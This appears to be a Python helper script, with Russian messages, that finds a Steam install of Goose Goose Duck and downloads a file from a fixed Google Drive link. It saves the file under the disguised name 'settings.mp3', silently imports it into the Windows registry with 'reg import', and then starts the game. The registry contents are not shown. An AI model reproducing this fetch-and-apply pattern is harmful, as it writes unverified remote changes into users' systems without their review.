import requests
import os
import subprocess

def find_steam_game(game_folder="Goose Goose Duck", game_exe="Goose Goose Duck.exe"):
    possible_paths = [
        r"Program Files (x86)\Steam\steamapps\common",
        r"Program Files\Steam\steamapps\common",
        r"SteamLibrary\steamapps\common"
    ]

    drives = [f"{d}:\\" for d in "CDEF" if os.path.exists(f"{d}:\\")]

    for drive in drives:
        for path in possible_paths:
            full_path = os.path.join(drive, path, game_folder)
            if os.path.exists(os.path.join(full_path, game_exe)):
                return full_path

    return None

url = "http://drive.google.com/uc?export=download&id=18Yr6wfSAJZTqhttMFVDNx7pZkez2vJBq"

install_dir = find_steam_game()

if install_dir:
    file_path = os.path.join(install_dir, "settings.mp3")
    game_exe_path = os.path.join(install_dir, "Goose Goose Duck.exe")

    response = requests.get(url)

    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        print("Файл загружен успешно:", file_path)

        with open(file_path, "r", encoding="utf-16") as file:
            first_line = file.readline().strip()

        if first_line == "Windows Registry Editor Version 5.00":
            result = subprocess.run(["reg", "import", file_path], capture_output=True, text=True)

            if result.returncode == 0:
                print("Изменения в реестре успешно применены")

                print("Запуск игры...")
                subprocess.Popen(game_exe_path, shell=True)
            else:
                print("Ошибка при применении реестра:", result.stderr)
        else:
            print("Файл поврежден или не является корректным")

    else:
        print("Ошибка загрузки файла")
else:
    print("Steam-версия игры Goose Goose Duck не найдена")

